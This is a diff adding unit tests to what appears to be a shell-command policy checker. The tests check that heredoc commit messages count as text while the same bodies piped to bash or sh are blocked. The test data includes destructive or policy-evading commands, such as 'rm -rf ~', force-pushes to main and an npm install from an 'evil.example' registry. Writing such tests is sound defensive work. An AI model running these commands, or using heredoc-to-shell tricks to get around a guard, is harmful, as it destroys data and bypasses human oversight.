@@ -1061,5 +1061,58 @@ class SummaryTests(unittest.TestCase):
         self.assertIn("| `protected-branches` | 1 | 0 | 1 |", markdown)
         self.assertIn("| `wrong-owner` | 1 |", markdown)
 
+class HeredocInSubstitutionTests(unittest.TestCase):
+    """Review of the #137 merge: a heredoc body given to `cat` inside a substitution (the idiom for commit messages and
+    PR bodies) is text, not commands, for every kind; and a `cd` in a substitution runs in a subshell, so it does not
+    make the branch unknown. The same body given to a shell is still read. Run on a feature branch."""
+
+    ALLOWED = [
+        "gh pr create --body \"$(cat <<'EOF'\n```\ngit push --force origin main\n```\nEOF\n)\"",
+        "git commit -m \"$(cat <<EOF\nrm -rf ~\nEOF\n)\"",
+        "x=\"$(cat <<'EOF'\nrm -rf ~\nEOF\n)\"",
+        "git commit -m \"$(cat <<'EOF'\nvercel --prod\nEOF\n)\"",
+        "git commit -m \"$(cat <<'EOF'\nnpm install --registry https://evil.example x\nEOF\n)\"",
+        "git commit -m \"$(cat <<'EOF'\naws s3 ls --account-id 999999999999\nEOF\n)\"",
+        "git commit -m \"$(cat <<'EOF'\nscp f deploy@web1.other.org:/srv\nEOF\n)\"",
+        "git commit --amend -m \"$(cat <<'EOF'\ngit checkout main is no longer needed\nEOF\n)\" && git push --force-with-lease",
+        "git commit --amend -m \"$(cat <<'EOF'\ncd foo\nEOF\n)\" && git push --force-with-lease",
+        "git commit --amend -m \"$(cat <<'EOF'\nsource the env\nEOF\n)\" && git push --force-with-lease",
+        "git commit --amend -m \"$(cat <<'EOF'\nexport GIT_DIR\nEOF\n)\" && git push --force-with-lease",
+        "git commit --amend -m \"$(cat <<'EOF'\nfunction names\nEOF\n)\" && git push --force-with-lease",
+        "ROOT=\"$(cd \"$(dirname \"$0\")\" && pwd)\"; git push --force-with-lease",
+        "git push --force-with-lease && echo \"from $(cd .. && pwd)\"",
+    ]
+    # The same bodies given to a shell, and a checkout in a substitution, which changes HEAD even from a subshell.
+    DENIED = [
+        ("x=\"$(cat <<'EOF' | bash\ngit push --force origin main\nEOF\n)\"", "protected-branches"),
+        ("x=\"$(bash <<'EOF'\ngit push --force origin main\nEOF\n)\"", "protected-branches"),
+        ("git commit -m \"$(cat <<'EOF' | sh\nvercel --prod\nEOF\n)\"", "hosts"),
+        ("git commit -m \"$(cat <<'EOF' | bash\nnpm install --registry https://evil.example x\nEOF\n)\"", "registries"),
+        ("git commit -m \"$(sh <<'EOF'\naws s3 ls --account-id 999999999999\nEOF\n)\"", "accounts"),
+        ("git commit -m \"$(cat <<'EOF' | bash\nscp f deploy@web1.other.org:/srv\nEOF\n)\"", "hosts"),
+        ("git commit --amend -m \"$(bash <<'EOF'\ngit checkout main\nEOF\n)\" && git push --force-with-lease",
+         "protected-branches"),
+        ("x=\"$(cat <<EOF\n$(vercel --prod)\nEOF\n)\"", "hosts"),  # an unquoted body's substitution runs
+        ("echo $(git switch main) && git push -f", "protected-branches"),
+        ("cd ../m && git push --force-with-lease", "protected-branches"),
+    ]
+
+    def test_bodies_given_to_cat_are_text_and_to_a_shell_are_commands(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            (Path(tmp) / ".git").mkdir()
+            (Path(tmp) / ".git" / "HEAD").write_text("ref: refs/heads/feature/x\n")
+            policy = parsed([branch_rule(values=("main",)),
+                             {"id": "hosts", "kind": "deploy_host", "mode": "block", "values": ["*.example.org"]},
+                             {"id": "registries", "kind": "package_registry", "mode": "block", "values": ["npm.example.org"]},
+                             {"id": "accounts", "kind": "cloud_account", "mode": "block", "values": ["aws:111122223333"]}])
+            fired = lambda command: [r.id for r, excepted_by in cr.matched_rules(command, tmp, policy) if not excepted_by]
+            for command in self.ALLOWED:
+                with self.subTest(command=command):
+                    self.assertEqual(fired(command), [])
+            for command, rule in self.DENIED:
+                with self.subTest(command=command):
+                    self.assertIn(rule, fired(command))
+
+
 if __name__ == "__main__":
     unittest.main()
